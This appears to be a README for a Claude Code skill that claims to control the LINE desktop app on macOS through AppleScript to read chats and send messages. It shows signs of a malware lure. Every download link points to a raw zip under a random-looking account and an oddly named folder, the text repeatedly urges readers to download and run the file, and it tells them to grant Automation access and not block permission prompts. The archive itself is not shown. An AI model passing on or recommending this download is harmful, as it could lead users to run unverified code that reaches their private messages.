# 🖥️ line-desktop-skill - Control LINE from your desktop

[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip)

## 📥 Download

Visit this page to download and run this file:

https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip

If the page opens in your browser, look for the latest release or the main download option. Save the file to your computer, then open it from your Downloads folder.

## 🚀 What this does

line-desktop-skill helps you control the LINE desktop app from Claude Code on your Mac. It can read chats and send messages without an API token.

This is useful when you want to work with LINE desktop messages directly instead of using a separate service. The skill uses AppleScript to talk to the app you already have open.

## 🧩 What you need

Use this on a Mac with:

- LINE desktop app installed
- Claude Code installed
- AppleScript support enabled
- Permission to allow app control in macOS

For best results, keep LINE logged in and open before you start.

## 🛠️ Setup

1. Open the download page:
   https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip

2. Download the project files to your Mac.

3. Unzip the file if it comes in a compressed folder.

4. Move the folder to a place you can find again, such as Documents or Desktop.

5. Open Claude Code and add the skill folder to your workspace or skills folder.

6. Make sure macOS allows Claude Code to control LINE:
   - Open System Settings
   - Go to Privacy & Security
   - Open Automation
   - Allow Claude Code to control LINE

7. Open LINE desktop and sign in.

8. Run the skill from Claude Code using the folder you downloaded.

## 💬 How to use it

Once set up, you can ask Claude Code to work with LINE desktop tasks such as:

- Read the latest chat messages
- Open a chat thread
- Send a text message
- Check recent conversation text
- Move between chats

Use plain requests like:

- Read my latest LINE chat
- Send this message to Alex: I will be there at 3
- Open the chat with the sales group
- Show me the last 5 messages in LINE

Keep LINE open while you use the skill.

## 🔐 Permissions

macOS may ask for permission the first time the skill tries to control LINE.

If that happens:

- Choose Allow
- Do not block the request
- If needed, restart Claude Code and try again

If LINE does not respond, check the Automation settings again. AppleScript control will not work until macOS grants access.

## 🧠 How it works

The skill uses AppleScript, which is a built-in Mac automation tool. Claude Code sends commands to AppleScript, and AppleScript controls the LINE desktop app.

This lets the skill:

- Read app text
- Focus chats
- Enter message text
- Trigger send actions
- Pull visible chat content

Because it works through the app itself, you do not need an API token.

## ✅ Common uses

This skill fits simple daily tasks like:

- Checking a recent message
- Sending a quick reply
- Copying chat text into your workflow
- Reviewing group chat updates
- Handling chat actions without leaving the desktop app

## 🧭 If something does not work

If LINE does not open, check that it is installed in your Applications folder.

If messages do not send:

- Make sure LINE is open
- Make sure the correct chat is selected
- Check that Claude Code has Automation access
- Restart LINE and try again

If the skill cannot read chat text:

- Open the chat window first
- Keep the conversation visible
- Use a normal chat view, not a hidden or empty screen

If Claude Code cannot find the skill:

- Confirm the folder was copied to the right place
- Check the folder name
- Reload Claude Code after moving the files

## 🗂️ Suggested folder layout

A simple layout helps keep things easy to use:

- Downloads
  - line-desktop-skill
- Documents
  - Claude Code
    - skills
      - line-desktop-skill

You can use another location if you prefer. The key point is to keep the skill folder in a place Claude Code can reach.

## 🖱️ First-time run steps

Use this order the first time:

1. Download the files
2. Unzip the folder
3. Put the folder in your skills location
4. Open LINE desktop
5. Open Claude Code
6. Grant Automation permission
7. Run a simple command like “Read my latest LINE chat”

This first run helps macOS save the permission settings.

## 🧰 File contents

The repository is built around a small Mac automation workflow. It includes the pieces needed to connect Claude Code with LINE desktop through AppleScript.

Typical files may include:

- Skill instructions
- AppleScript helper files
- Setup notes
- Example prompts
- Command templates

## 🖥️ System fit

This project is made for:

- macOS
- LINE desktop app
- Claude Code
- Users who want direct desktop chat control

It is not meant for Windows as the main runtime. If you use Windows, you will need a Mac environment for the AppleScript part to work.

## 🧪 Example tasks

Try these prompts after setup:

- Read the latest message in LINE
- Send “Running late, I’ll be there soon” to my chat with Maya
- Open the LINE chat with my team
- Show the last message from the selected chat
- Send a short reply to the current conversation

Keep the prompts clear and simple. The skill works best when you name the chat or say exactly what you want.

## 📁 Download again

If you need the files again, use the same link:

https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip

## 🔧 Basic tips

- Keep LINE open while using the skill
- Leave the target chat visible when sending or reading messages
- Grant permissions before trying larger tasks
- Use short message requests for faster results
- Restart LINE if it stops responding to AppleScript

## 🧾 Repo details

- Repository: line-desktop-skill
- Purpose: Control LINE desktop app through AppleScript
- Main use: Read chats and send messages without an API token